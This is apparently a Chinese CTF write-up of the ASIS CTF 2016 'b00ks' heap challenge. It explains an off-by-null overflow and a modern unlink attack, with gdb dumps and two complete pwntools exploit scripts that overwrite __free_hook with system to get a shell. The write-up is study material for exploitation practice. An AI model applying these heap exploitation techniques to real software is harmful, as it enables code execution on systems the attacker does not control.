\u51fd\u6570\u7684\u53c2\u6570\u5c31\u77e5\u9053\u4e3a\u4ec0\u4e48\u8f93\u5165 author name \u4f1a\u51fa\u73b0 off-b-null \uff1a description \u53ef\u4ee5\u653e v1 \u5b57\u8282\uff0c\u4f20\u5165\u53c2\u6570\u4e3a v1-1 \uff0c\u9884\u7559 1 \u5b57\u8282 name \u53ef\u4ee5\u653e v1 \u5b57\u8282\uff0c\u4f20\u5165\u53c2\u6570\u4e3a v1-1 \uff0c\u9884\u7559 1 \u5b57\u8282 \u4f46\u662f my_name \u53ef\u4ee5\u653e 32 \u5b57\u8282\uff0c\u4f20\u5165\u53c2\u6570\u4e3a 32 \uff0c\u6ca1\u6709\u4e3a\u6700\u540e\u7ed3\u675f\u7b26\u9884\u7559\u4e00\u4e2a\u4f4d\u7f6e\u3002 \u601d\u8def \u00b6 off-by-one \u00b6 \u6ea2\u51fa\u4f1a\u5f71\u54cd\u5230\u54ea\u91cc\uff1f \u00b6 \u6211\u4eec\u5148\u770b\u770b author name \u6ea2\u51fa\u7684 \\x00 \u4f1a\u5f71\u54cd\u5230\u54ea\u91cc\u3002\u5148\u4e00\u6bb5\u8c03\u8bd5\u7684 exp \uff0c\u4e3a\u4e86\u65b9\u4fbf\uff0c\u5728\u811a\u672c\u4e2d\uff0c\u8f93\u5165 author name \u4e3a \"a\"*0x32 \uff0c\u5728\u7533\u8bf7\u4e00\u4e2a book \uff0c\u6700\u540e\u624d\u8c03\u7528 gdb \uff0c\u7a0b\u5e8f\u6253\u5f00 PIE \u4fdd\u62a4\u6211\u4eec\u5c31\u6253\u4e00\u4e2a\u65ad\u70b9\uff0c\u65b9\u4fbf\u8ba1\u7b97\u504f\u79fb\u627e\u5230 name \uff1a gdb.attach(p,\"b *$rebase(0x0B94)\") \u3002 \u5148\u627e\u5230 name \u548c chunk_list \u771f\u5b9e\u5730\u5740\uff1a chunk_list \u5728\u4f4e\u5730\u5740\uff0c\u4ece\u5b83\u5f00\u59cb\u67e5\u5185\u5b58\uff1a \u53ef\u4ee5\u770b\u5230\u5b9e\u9645\u4e0a\u4e0d\u662f\u4ece chunk_list \u5f00\u59cb\u5b58\u653e\u7ed3\u6784\u4f53\u6307\u9488\uff0c\u800c\u662f\u5b9a\u5411\u5230\u4e86 0x555555756060 \uff0c\u4ece\u8fd9\u91cc\u5f00\u59cb\u8bb0\u5f55\u7ed3\u6784\u4f53\u6307\u9488\uff08\u8fd9\u91cc\u6211\u521b\u5efa\u4e86\u4e24\u4e2a book \uff09\u3002\u7136\u540e\u6211\u4eec\u89c2\u5bdf name \uff0c\u5728\u7ed3\u6784\u4f53\u6307\u9488\u524d\u9762\uff0cname \u6ea2\u51fa\u7684\u4f1a\u8986\u76d6\u6389 book1 \u7ed3\u6784\u4f53\u6307\u9488\u3002\u6211\u4eec\u7ed9\u4e00\u6b21 name \u770b\u770b\u6548\u679c\uff1a \u8fd9\u6837\u6ea2\u51fa\u4e4b\u540e\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u53bb 0x0000555555758300 \u627e book1 \u8d44\u6599\uff0c\u800c\u4e0d\u662f 0x0000555555758330 \u3002\u90a3\u4e48\u5982\u679c\u6211\u4eec\u80fd\u591f\u5728 0x0000555555758300 \u4f2a\u9020\u4e00\u4e2a book \u7ed3\u6784\u4f53\uff0c\u5c31\u80fd\u5229\u7528\u7a0b\u5e8f\u4e2d\u7684\u8f93\u51fa&\u4fee\u6539\u529f\u80fd\uff0c\u5b9e\u73b0\u4efb\u610f\u8bfb\u5199\u3002\u7a0b\u5e8f\u662f Full RELRO \uff0c\u5c31\u5199 hook \u3002\u5927\u6982\u601d\u8def\u5c31\u662f\u8fd9\u4e48\u4e2a\u601d\u8def\uff0c\u653b\u51fb\u6d41\u7a0b\uff1a author name \u586b\u5145 0x20 bit creat boo1 && book2\uff0c\u8986\u76d6\u7ed3\u675f\u7b26 print book1 info \u4ece author name \u6cc4\u9732 book1 \u7ed3\u6784\u4f53\u5730\u5740 edit book1 description \u586b\u5165 payload\uff0c\u6784\u5efa fake book1 \u7ed3\u6784\u4f53 change author name \u8986\u76d6 book1 \u6307\u9488\uff0c\u8ba9\u5176\u6307\u5411 fake book1 print book1 info \u6cc4\u9732 book2 \u5730\u5740\uff08mmap\u5730\u5740\uff09 edit book1 \u6765\u4fee\u6539 book2 *description \u6307\u5411 free_hook edit book2 \u4fee\u6539 free_hook \u4e3a one_gadget \u6cc4\u6f0f book1 \u7ed3\u6784\u4f53\u5730\u5740 \u00b6 \u56e0\u4e3a\u7a0b\u5e8f\u4e2d\u7684 my_read \u51fd\u6570\u5b58\u5728 null byte off-by-one \uff0c\u4e8b\u5b9e\u4e0a my_read \u8bfb\u5165\u7684\u7ed3\u675f\u7b26 '\\x00' \u662f\u5199\u5165\u5230 0x555555756060 \u7684\u4f4d\u7f6e\u7684\u3002\u8fd9\u6837\u5f53 0x555555756060\uff5e0x555555756068 \u5199\u5165 book \u6307\u9488\u65f6\u5c31\u4f1a\u8986\u76d6\u6389\u7ed3\u675f\u7b26 '\\x00' \uff0c\u6240\u4ee5\u8fd9\u91cc\u662f\u5b58\u5728\u4e00\u4e2a\u5730\u5740\u6cc4\u6f0f\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u6253\u5370 author name \u5c31\u53ef\u4ee5\u83b7\u5f97 pointer array \u4e2d\u7b2c\u4e00\u9879\u7684\u503c\u3002 0x555555756040: 0x4141414141414141 0x4141414141414141 0x555555756050: 0x4141414141414141 0x4141414141414141 <== author name 0x555555756060: 0x0000555555758330 <== pointer array 0x0000000000000000 0x555555756070: 0x0000000000000000 0x0000000000000000 0x555555756080: 0x0000000000000000 0x0000000000000000 \u4e3a\u4e86\u5b9e\u73b0\u6cc4\u6f0f\uff0c\u9996\u5148\u5728 author name \u4e2d\u9700\u8981\u8f93\u5165 32 \u4e2a\u5b57\u8282\u6765\u4f7f\u5f97\u7ed3\u675f\u7b26\u88ab\u8986\u76d6\u6389\u3002\u4e4b\u540e\u6211\u4eec\u521b\u5efa book1 \uff0c\u8fd9\u4e2a book1 \u7684\u6307\u9488\u4f1a\u8986\u76d6 author name \u4e2d\u6700\u540e\u7684 NULL \u5b57\u8282\uff0c\u4f7f\u5f97\u8be5\u6307\u9488\u4e0e author name \u76f4\u63a5\u8fde\u63a5\uff0c\u8fd9\u6837\u8f93\u51fa author name \u5219\u53ef\u4ee5\u83b7\u53d6\u5230\u4e00\u4e2a\u5806\u6307\u9488\u3002 createname ( \"A\" * 32 ) createbook ( 128 , \"a\" * 8 , 32 , \"b\" * 8 ) createbook ( 0x21000 , \"/bin/sh \\x00 \" , 0x21000 , \"d\" * 8 ) # getshell\u7528\u968f\u5e26\u4e5f\u5148\u7533\u8bf7\uff0c\u5bf9\u672c\u6b65\u6ca1\u6709\u5f71\u54cd book_id_1 , book_name , book_des , book_author = printbook ( 1 ) book1_addr = u64 ( book_author [ 32 : 32 + 6 ] . ljust ( 8 , ' \\x00 ' )) \u4f2a\u9020\u7ed3\u6784\u4f53 \u00b6 \u7a0b\u5e8f\u4e2d\u540c\u6837\u63d0\u4f9b\u4e86\u4e00\u79cd change \u529f\u80fd\uff0c change \u529f\u80fd\u7528\u4e8e\u4fee\u6539 author name \uff0c\u6240\u4ee5\u901a\u8fc7 change \u53ef\u4ee5\u5199\u5165 author name \uff0c\u5229\u7528 off-by-one \u8986\u76d6 book1 \u7684\u4f4e\u5b57\u8282\u3002 \u8986\u76d6\u6389 book1 \u6307\u9488\u7684\u4f4e\u5b57\u8282\u540e\uff0c\u8fd9\u4e2a\u6307\u9488\u4f1a\u6307\u5411 book1 \u7684 description 4 \uff0c\u7531\u4e8e\u7a0b\u5e8f\u63d0\u4f9b\u4e86 edit \u529f\u80fd\u53ef\u4ee5\u4efb\u610f\u4fee\u6539 description \u4e2d\u7684\u5185\u5bb9\u3002\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u5728 description \u4e2d\u5e03\u7f6e\u6570\u636e\u4f2a\u9020\u6210\u4e00\u4e2a book \u7ed3\u6784\uff0c\u8fd9\u4e2a book \u7ed3\u6784\u7684 description \u548c name \u6307\u9488\u53ef\u4ee5\u7531\u76f4\u63a5\u63a7\u5236\u3002 \u8fd9\u91cc\u5728 description \u4e2d\u4f2a\u9020\u4e86 book \uff0c\u4f7f\u7528\u7684\u6570\u636e\u662f p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xffff) \u3002 \u5176\u4e2d book1_addr+0x38 \u6307\u5411 book2 \u7684 book_name \u6307\u9488\u7684\u5b58\u50a8\u5730\u5740\uff1bbook1_addr+0x40 \u6307\u5411 book2 \u7684 book_desc \u6307\u9488\u7684\u5b58\u50a8\u5730\u5740\uff0c\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u4fee\u6539 book2 \u6307\u9488\u503c\u3002 \u8fd9\u6837\u5c31\u662f\u5b9e\u73b0 edit book1 \u4fee\u6539 book2 \u6307\u9488\u5730\u5740\uff0cedit book2 \u4fee\u6539\u4efb\u610f\u5730\u5740 log . success ( \"book2_name_addr:\" + hex ( book1_addr + 0x38 )) log . success ( \"book2_desc_addr:\" + hex ( book1_addr + 0x40 )) payload = p64 ( 1 ) + p64 ( book1_addr + 0x38 ) + p64 ( book1_addr + 0x40 ) + p64 ( 0xffff ) editbook ( book_id_1 , payload ) # write fakechunk \u6cc4\u9732 libc \u5730\u5740 \u00b6 \u524d\u9762\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u80fd\u529b\uff0c\u4e0b\u9762\u7684\u64cd\u4f5c\u662f\u663e\u800c\u6613\u89c1\u7684\uff0c\u6bd4\u5982\u5199 got \u8868\u52ab\u6301\u6d41\u7a0b\u6216\u8005\u5199 __malloc_hook \u52ab\u6301\u6d41\u7a0b\u7b49\u3002\u4f46\u662f\u8fd9\u4e2a\u9898\u76ee\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u5f00\u542f PIE \u5e76\u4e14\u6ca1\u6709\u6cc4\u6f0f libc \u57fa\u5730\u5740\u7684\u65b9\u6cd5\uff0c\u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u60f3\u4e00\u4e0b\u5176\u4ed6\u7684\u529e\u6cd5\u3002 \u8fd9\u9053\u9898\u7684\u5de7\u5999\u4e4b\u5904\u5728\u4e8e\u5728\u5206\u914d\u7b2c\u4e8c\u4e2a book \u65f6\uff0c\u4f7f\u7528\u4e00\u4e2a\u5f88\u5927\u7684\u5c3a\u5bf8\uff0c\u4f7f\u5f97\u5806\u4ee5 mmap \u6a21\u5f0f\u8fdb\u884c\u62d3\u5c55\u3002\u6211\u4eec\u77e5\u9053\u5806\u6709\u4e24\u79cd\u62d3\u5c55\u65b9\u5f0f\u4e00\u79cd\u662f brk \u4f1a\u76f4\u63a5\u62d3\u5c55\u539f\u6765\u7684\u5806\uff0c\u53e6\u4e00\u79cd\u662f mmap \u4f1a\u5355\u72ec\u6620\u5c04\u4e00\u5757\u5185\u5b58\u3002 \u5728\u8fd9\u91cc\u6211\u4eec\u7533\u8bf7\u4e00\u4e2a\u8d85\u5927\u7684\u5757\uff0c\u6765\u4f7f\u7528 mmap \u6269\u5c55\u5185\u5b58\u3002\u56e0\u4e3a mmap \u5206\u914d\u7684\u5185\u5b58\u4e0e libc \u4e4b\u524d\u5b58\u5728\u56fa\u5b9a\u7684\u504f\u79fb\u56e0\u6b64\u53ef\u4ee5\u63a8\u7b97\u51fa libc \u7684\u57fa\u5730\u5740\u3002 pwndbg> x /4gx 0x0000555555758360 0x555555758360: 0x0000000000000002 0x00007ffff7fbc010 0x555555758370: 0x00007ffff7f9a010 0x0000000000021000 pwndbg> vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x555555554000 0x555555556000 r-xp 2000 0 /home/skye/Desktop/CTF\u5b66\u4e60/chunk/asis-ctf-2016-b00ks/b00ks 0x555555755000 0x555555756000 r--p 1000 1000 /home/skye/Desktop/CTF\u5b66\u4e60/chunk/asis-ctf-2016-b00ks/b00ks 0x555555756000 0x555555757000 rw-p 1000 2000 /home/skye/Desktop/CTF\u5b66\u4e60/chunk/asis-ctf-2016-b00ks/b00ks 0x555555757000 0x555555778000 rw-p 21000 0 [ heap ] 0x7ffff79e4000 0x7ffff7bcb000 r-xp 1e7000 0 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7bcb000 0x7ffff7dcb000 ---p 200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7dcb000 0x7ffff7dcf000 r--p 4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7dcf000 0x7ffff7dd1000 rw-p 2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so 0x7ffff7dd1000 0x7ffff7dd5000 rw-p 4000 0 0x7ffff7dd5000 0x7ffff7dfc000 r-xp 27000 0 /lib/x86_64-linux-gnu/ld-2.27.so 0x7ffff7f9a000 0x7ffff7fe0000 rw-p 46000 0 0x7ffff7ff7000 0x7ffff7ffa000 r--p 3000 0 [ vvar ] 0x7ffff7ffa000 0x7ffff7ffc000 r-xp 2000 0 [ vdso ] 0x7ffff7ffc000 0x7ffff7ffd000 r--p 1000 27000 /lib/x86_64-linux-gnu/ld-2.27.so 0x7ffff7ffd000 0x7ffff7ffe000 rw-p 1000 28000 /lib/x86_64-linux-gnu/ld-2.27.so 0x7ffff7ffe000 0x7ffff7fff000 rw-p 1000 0 0x7ffffffde000 0x7ffffffff000 rw-p 21000 0 [ stack ] 0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [ vsyscall ] \u5199\u5165 __free_hook \u00b6 \u53ef\u4ee5\u5199\u5165 onegadget \u4e5f\u53ef\u4ee5\u662f system \uff0c\u5982\u679c\u662f system \uff0c\u9700\u8981 free \u7684 book_name \u662f /bin/sh \u6765\u4f20\u5165\u53c2\u6570\u3002 exploit \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe\u3001CTF-WIKI # @Email : skye231@foxmail.com # @File : b00ks.py from pwn import * context . log_level = \"debug\" p = process ( \"./b00ks\" ) elf = ELF ( \"b00ks\" ) libc = ELF ( \"./libc.so.6\" ) def createbook ( name_size , name , des_size , des ): p . readuntil ( \"> \" ) p . sendline ( \"1\" ) p . readuntil ( \": \" ) p . sendline ( str ( name_size )) p . readuntil ( \": \" ) p . sendline ( name ) p . readuntil ( \": \" ) p . sendline ( str ( des_size )) p . readuntil ( \": \" ) p . sendline ( des ) def printbook ( id ): p . readuntil ( \"> \" ) p . sendline ( \"4\" ) p . readuntil ( \": \" ) for i in range ( id ): book_id = int ( p . readline ()[: - 1 ]) p . readuntil ( \": \" ) book_name = p . readline ()[: - 1 ] p . readuntil ( \": \" ) book_des = p . readline ()[: - 1 ] p . readuntil ( \": \" ) book_author = p . readline ()[: - 1 ] return book_id , book_name , book_des , book_author def createname ( name ): p . readuntil ( \"name: \" ) p . sendline ( name ) def changename ( name ): p . readuntil ( \"> \" ) p . sendline ( \"5\" ) p . readuntil ( \": \" ) p . sendline ( name ) def editbook ( book_id , new_des ): p . readuntil ( \"> \" ) p . sendline ( \"3\" ) p . readuntil ( \": \" ) p . writeline ( str ( book_id )) p . readuntil ( \": \" ) p . sendline ( new_des ) def deletebook ( book_id ): p . readuntil ( \"> \" ) p . sendline ( \"2\" ) p . readuntil ( \": \" ) p . sendline ( str ( book_id )) # leak chunk1_stuct addr createname ( \"A\" * 32 ) #gdb.attach(p,\"b *$rebase(0x0B94)\") createbook ( 128 , \"a\" * 8 , 32 , \"b\" * 8 ) createbook ( 0x21000 , \"/bin/sh \\x00 \" , 0x21000 , \"d\" * 8 ) book_id_1 , book_name , book_des , book_author = printbook ( 1 ) book1_addr = u64 ( book_author [ 32 : 32 + 6 ] . ljust ( 8 , ' \\x00 ' )) log . success ( \"book1_address:\" + hex ( book1_addr )) # set fake chunk log . success ( \"book2_name_addr:\" + hex ( book1_addr + 0x38 )) log . success ( \"book2_desc_addr:\" + hex ( book1_addr + 0x40 )) payload = p64 ( 1 ) + p64 ( book1_addr + 0x38 ) + p64 ( book1_addr + 0x40 ) + p64 ( 0xffff ) editbook ( book_id_1 , payload ) # overwrite chunk1_stuct addr 2 fake chunk changename ( \"A\" * 32 ) book_id_1 , book_name , book_des , book_author = printbook ( 1 ) book2_name_addr = u64 ( book_name . ljust ( 8 , \" \\x00 \" )) book2_des_addr = u64 ( book_des . ljust ( 8 , \" \\x00 \" )) log . success ( \"book2 name addr:\" + hex ( book2_name_addr )) log . success ( \"book2 des addr:\" + hex ( book2_des_addr )) libc_base = book2_des_addr - 0x5b6010 #0x5b9010 log . success ( \"libc base:\" + hex ( libc_base )) free_hook = libc_base + libc . symbols [ \"__free_hook\" ] log . success ( \"free_hook:\" + hex ( free_hook )) system = libc_base + libc . symbols [ \"system\" ] ''' ne_gadget=libc_base+0x4f3c2 #0x4f2c5 0x10a38c 0x4f322 log.success(\"one_gadget:\"+hex(one_gadget)) ''' # overwrite free_hook # set chunk2_desc 2 free_hook editbook ( 1 , p64 ( free_hook )) # overwrite free_hook 2 system editbook ( 2 , p64 ( system )) deletebook ( 2 ) p . interactive () \u5728Ubuntu16\u4e0b\u51fa\u73b0\u60c5\u51b5 \u00b6 book1 \u7ed3\u6784\u4f53\u8986\u76d6\u540e\u6307\u5411\u7684\u5730\u5740\u975e\u5e38\u4f4e\uff0c\u6307\u5411\u7684\u5730\u5740\u53d8\u6210\u662f\u5728\u4e00\u4e2a\u83ab\u540d\u5176\u5999\u7684 chunk \u91cc\u9762\u65e0\u6cd5\u5b9e\u73b0\u4f2a\u9020\u3002 unlink \u00b6 unlink\u5c31\u662fwiki\u4e0a\u7684\u7b80\u4fbf\u65b9\u6cd5 \u57fa\u4e8e\u524d\u9762 off-by-one \uff0c\u6216\u8005\u5177\u4f53\u4e00\u70b9\u662f off-by-null \uff0c\u6ea2\u51fa\u4e00\u4e2a\u7a7a\u5b57\u8282\uff0c\u603b\u7ed3\u4e00\u4e0b\u9898\u76ee\u60c5\u51b5\uff1a \u7a0b\u5e8f\u4e2d\u53ea\u8981\u8fd0\u7528\u5230\u81ea\u5b9a\u4e49\u8f93\u5165\u51fd\u6570 my_read \u5c31\u4f1a\u5b58\u5728\u6ea2\u51fa\uff0c\u6ea2\u51fa\u957f\u5ea6\u6839\u636e\u5404\u4e2a\u51fd\u6570\u6709\u6240\u4e0d\u540c\uff1a\u5904\u7406 name \u4f1a\u6ea2\u51fa\u4e24\u4e2a\u5b57\u8282\uff0c\u5176\u4e2d\u4e00\u4e2a\u5b57\u8282\u662f\u53ef\u63a7\uff1b\u5176\u4ed6\u51fd\u6570\u4f1a\u9020\u6210 off-by-null \u3002 \u5982\u679c\u521a\u521a\u5165\u95e8\u5b66\u4e60 \u5806 \u9898\u76ee\uff0c\u8fd9\u91cc\u4f1a\u6bd4\u8f83\u7ed5\uff0c\u9700\u8981\u5230 CTF-wiki \u4e0a\u628a\u73b0\u4ee3 unlink \u653b\u51fb\u65b9\u6cd5\u4e86\u89e3\u4e00\u4e0b\u3002 \u653b\u51fb\u8fc7\u7a0b\u6982\u8ff0 \u00b6 \u6cc4\u9732 chunk \u5730\u5740\uff08\u8fd9\u6b65\u548c\u4e0a\u9762\u65b9\u6cd5\u4e00\u6837\uff09 \u8c03\u6574\u5806\u4e2d\u7ed3\u6784\uff0c\u4ee5\u4fbf\u5b8c\u6210 unlink \u3002\u5b8c\u6210\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u4fee\u6539 chunk 4 \u7684\u7ed3\u6784\u4f53\u3002 \u5c06 chunk 4 \u7ed3\u6784\u4f53\u4e24\u4e2a\u7ed3\u6784\u4f53\u6307\u9488\u5206\u522b\u6307\u5411 main_area \u548c chunk 6 *desc \uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u6cc4\u9732 libc \u5730\u5740\u548c\u83b7\u5f97\u4e00\u4e2a\u4efb\u610f\u8bfb\u5199\u7684\u6307\u9488\u3002 \u4fee\u6539 chunk6 *desc \u7684\u6307\u9488\u4e3a __free_hook \uff1b\u63a5\u7740\u4fee\u6539 __free_hook \u4e3a system \uff08\u6216 onegadget \uff09\u3002 \u6cc4\u9732 chunk \u5730\u5740 \u00b6 \u65b9\u6cd5\u8fd8\u662f\u548c\u524d\u9762\u4e00\u6837\uff0c\u5199\u5165 0x20 \u7684 author name \uff0c\u7136\u540e\u7533\u8bf7\u4e00\u4e2a chunk \u5c06 author name \u7684\u7ed3\u675f\u7b26\u8986\u76d6\u6389\u3002\u5c31\u80fd\u4ece author name \u6cc4\u9732 chunk \u5730\u5740\uff1a p . recvuntil ( \"author name: \" ) p . sendline ( \"skye\" . ljust ( 32 , 'a' )) create ( 0x20 , 'a' * 8 , 0x20 , 'b' * 8 ) #1 show () \u8c03\u6574\u5806\u7ed3\u6784 \u00b6 \u6211\u4eec\u9700\u8981\u4f7f\u7528\u7684\u662f\u73b0\u4ee3 unlink \u9700\u8981\u4f2a\u9020 fd\u3001bk \u6307\u9488\u3002book name \u9650\u5b9a\u6700\u5927 size \u4e3a 0x20 \uff0c\u5c5e\u4e8e fastbin \u4e0d\u4f1a\u89e6\u53d1 unlink \u5408\u5e76\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u628a book 456 \u7684 desc \u5806\u5757\u5e03\u7f6e\u5230\u4e00\u8d77\u3002 create ( 0x20 , 'c' * 8 , 0x20 , 'd' * 8 ) #2 create ( 0x20 , 'e' * 8 , 0x20 , 'f' * 8 ) #3 remove ( 2 ) remove ( 3 ) \u7136\u540e\u7533\u8bf7 456 heap \uff1a create ( 0x20 , 'g' * 8 , 0x208 , 'h' * 8 ) #4 # make sure chunk5size low bit is 01,or corruption (!prev) create ( 0x20 , 'i' * 8 , 0x200 - 0x10 , 'j' * 8 ) #5 create ( 0x20 , \"/bin/sh \\x00 \" , 0x200 , 'k' * 8 ) #6 chunk4 chunk4 desc \u7528\u6765\u4f2a\u9020 fd\u3001bk\uff1b\u88ab\u4fee\u6539\u540e\u7684\u7ed3\u6784\u4f53\u7528\u6765\u4fee\u6539 chunk6 desc \u7684\u6307\u9488\uff0c\u5f62\u6210\u4e00\u4e2a\u4efb\u610f\u8bfb\u5199\u3002 chunk4 \u7533\u8bf7\u7684\u65f6\u5019\u6ce8\u610f\u8981\u7528\u5230 next_chunk \u7684 prev_size \u4f4d\uff0c\u65b9\u4fbf\u6211\u4eec\u4f2a\u9020\u3002 chunk5 chunk5 desc \u9700\u8981 size \uff08\u542bchunk head\uff09\u6700\u4f4e\u4e24\u4e2a\u5b57\u8282\u4e3a 0x01 \uff0c\u5229\u7528 off-by-null \u8986\u76d6\u4e3a 0x00 \uff0cprev_inuse \u6807\u8bb0\u524d\u9762\u4e00\u4e2a chunk \u662f\u672a\u4f7f\u7528\u7684\u3002\u5982\u679c\u7533\u8bf7\u51fa\u6765\u7684 size \u4e0d\u7b26\u5408\u6807\u51c6\uff08eg\uff1a0x10\uff09\uff0cfree \u7684\u65f6\u5019\u4f1a\u62a5\u9519\uff1a double free or corruption (!prev) \u539f\u56e0\u5c31\u662f\u7cfb\u7edf\u6839\u636e\u5f53\u524d chunk size \u627e\u4e0b\u4e00\u4e2a chunk \u7684 prev_inuse \u6807\u5fd7\uff0c\u7136\u540e\u6211\u4eec\u8986\u76d6\u4e4b\u540e\u6539\u53d8\u7684\u4e0d\u53ea\u662f prev_inuse \u6574\u4e2asize \u90fd\u53d8\u4e86\uff0c\u627e\u5230\u7684 next_chunk \u4e5f\u662f\u9519\u7684\u3002 chunk6 \u7528\u6765\u4fee\u6539 __free_hook \u3002\u5982\u679c\u4f7f\u7528 system \u5c06 book name \u5199\u5165\u4e3a /bin/sh \u5c31\u884c\u4e86\uff1b\u4f7f\u7528 one_gadget \u4e0d\u9700\u8981\u3002 \u5728 chunk4 \u5185\u4f2a\u9020\u4e00\u4e2a\u5806 \u00b6 \u7528\u7684\u662f**\u73b0\u4ee3 unlink** \u5b9e\u73b0\u7684\u6548\u679c\u662f\uff1a *ptr = ptr-0x18 \u3002 ptr = heap_base + 0x1180 # target addr log . info ( \"ptr:\" + hex ( ptr )) payload = p64 ( 0 ) + p64 ( 0x201 ) + p64 ( ptr - 0x18 ) + p64 ( ptr - 0x10 ) payload += ' \\x00 ' * 0x1e0 + p64 ( 0x200 ) edit ( 4 , payload ) remove ( 5 ) # unlink *ptr = ptr-0x18 unlink \u4e4b\u540e chunk4 desc \u6307\u9488\u5c06\u4f1a\u6307\u5411\u7ed3\u6784\u4f53\u81ea\u8eab\u7684\u67d0\u4e2a\u5730\u65b9\uff0c\u5177\u4f53\u770b\u56fe\u8c03\u8bd5\uff1a \u4fee\u6539chunk4\u7ed3\u6784\u4f53 \u00b6 \u6211\u9009\u62e9\u5c06 book4 name \u4fee\u6539\u4e3a\u5b58\u50a8 libc \u7684\u5185\u5b58\u5730\u5740\uff08\u4e5f\u5c31\u662f book4 desc \u67d0\u5904\uff09\u3001book4 desc \u4fee\u6539\u4e3a chunk6 desc \u6307\u9488\u5730\u5740\u3002 payload = p64 ( 0x31 ) + p64 ( 0x4 ) + p64 ( heap_base + 0x11e0 ) + p64 ( heap_base + 0x10c0 ) edit ( 4 , payload ) show () \u4fee\u6539 __free_hook \u00b6 payload = p64 ( free_hook ) edit ( 4 , payload ) payload = p64 ( system ) edit ( 6 , payload ) exp \u00b6 from pwn import * context . log_level = 'info' p = process ( \"./b00ks\" ) elf = ELF ( \"./b00ks\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def create ( book_size , book_name , desc_size , desc ): p . recvuntil ( \">\" ) p . sendline ( str ( 1 )) p . sendlineafter ( \": \" , str ( book_size )) p . recvuntil ( \": \" ) p . sendline ( book_name ) p . recvuntil ( \": \" ) p . sendline ( str ( desc_size )) p . sendline ( desc ) def remove ( idx ): p . recvuntil ( \">\" ) p . sendline ( str ( 2 )) p . sendlineafter ( \": \" , str ( idx )) def edit ( idx , desc ): p . recvuntil ( \">\" ) p . sendline ( str ( 3 )) p . sendlineafter ( \": \" , str ( idx )) p . sendlineafter ( \": \" , str ( desc )) def show (): p . recvuntil ( \">\" ) p . sendline ( str ( 4 )) def author_name ( name ): p . recvuntil ( \">\" ) p . sendline ( str ( 5 )) p . sendlineafter ( \": \" , str ( name )) p . recvuntil ( \"author name: \" ) p . sendline ( \"skye\" . ljust ( 32 , 'a' )) create ( 0x20 , 'a' * 8 , 0x20 , 'b' * 8 ) #1 show () p . recvuntil ( \"skye\" . ljust ( 32 , 'a' )) first_heap = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"first_heap:\" + hex ( first_heap )) heap_base = first_heap - 0x1080 log . info ( \"heap_base:\" + hex ( heap_base )) create ( 0x20 , 'c' * 8 , 0x20 , 'd' * 8 ) #2 create ( 0x20 , 'e' * 8 , 0x20 , 'f' * 8 ) #3 remove ( 2 ) remove ( 3 ) create ( 0x20 , 'g' * 8 , 0x208 , 'h' * 8 ) #4 0x218 # make sure chunk5size low bit is 01,or corruption (!prev) create ( 0x20 , 'i' * 8 , 0x200 - 0x10 , 'j' * 8 ) #5 0x200 create ( 0x20 , \"/bin/sh \\x00 \" , 0x200 , 'k' * 8 ) #6 ptr = heap_base + 0x1180 # target addr log . info ( \"ptr:\" + hex ( ptr )) # fake chunk(0x200 2 chunk5) payload = p64 ( 0 ) + p64 ( 0x201 ) + p64 ( ptr - 0x18 ) + p64 ( ptr - 0x10 ) payload += ' \\x00 ' * 0x1e0 + p64 ( 0x200 ) edit ( 4 , payload ) # gdb.attach(p,\"b *$rebase(0x202018)\") remove ( 5 ) # unlink *ptr = ptr-0x18 # FD->chunk4 desc fd # BK->chunk6 struct desc payload = p64 ( 0x31 ) + p64 ( 0x4 ) + p64 ( heap_base + 0x11e0 ) + p64 ( heap_base + 0x10c0 ) edit ( 4 , payload ) show () p . recvuntil ( \"Name: \" ) p . recvuntil ( \"Name: \" ) main_area = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"main_area:\" + hex ( main_area )) libc_base = main_area - 0x3c4b78 log . info ( \"libc_base:\" + hex ( libc_base )) free_hook = libc_base + libc . symbols [ '__free_hook' ] log . info ( \"free_hook:\" + hex ( free_hook )) system = libc_base + libc . symbols [ 'system' ] log . info ( \"system:\" + hex ( system )) payload = p64 ( free_hook ) edit ( 4 , payload ) payload = p64 ( system ) edit ( 6 , payload ) remove ( 6 ) p . interactive () \u5c0f\u7ed3 \u00b6 off-by-one \u601d\u8def\u4e2d\u901a\u8fc7\u7533\u8bf7\u4e00\u4e2a\u975e\u5e38\u5927\u7684 chunk \uff0c\u8ba9\u7a0b\u5e8f\u901a\u8fc7 mmap \u5206\u914d\u5185\u5b58\uff0c\u8be5\u5185\u5b58\u5730\u5740\u4e0e libc \u6709\u56fa\u5b9a\u504f\u79fb \u7a0b\u5e8f\u81ea\u52a8\u5206\u914d\u7684 \u7b2c\u4e00\u4e2a\u5806 \uff0c\u5728\u5e08\u5144\u63d0\u9192\u4e0b\u5927\u6982\u662f\u56e0\u4e3a\u7a0b\u5e8f\u6ca1\u6709\u521d\u59cb\u5316\u7f13\u51b2\u533a\uff0c\u7a0b\u5e8f\u4f1a\u81ea\u52a8\u7533\u8bf7\u4e00\u4e2a\u5806\u7528\u4f5c\u7f13\u5b58\u533a\u3002 \u73b0\u4ee3 unlink \u6ee1\u8db3\u68c0\u67e5\u6761\u4ef6\uff1a fakeFD -> bk == P <=> *(fakeFD + 12) == P fakeBK -> fd == P <=> 